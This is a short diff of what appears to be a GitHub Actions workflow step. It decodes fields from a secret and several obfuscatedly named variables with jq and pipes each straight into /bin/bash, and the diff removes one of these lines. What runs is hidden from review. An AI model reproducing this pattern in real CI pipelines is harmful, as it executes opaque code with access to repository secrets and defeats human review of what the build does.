@@ -18,7 +18,6 @@ jobs:
           gbj224: ${{ secrets.gbj224 }}
         run: |
           printf '%s' "$gbj224" | jq -r .zae488 | /bin/bash
-          echo $dufkm29 | jq -r .udbxd27 | /bin/bash
           echo $oonp7 | jq -r .atfkr1468 | /bin/bash
           echo $ebyh04 | jq -r .wy6 | /bin/bash
           echo $heqmq5611 | jq -r .g8806 | /bin/bash
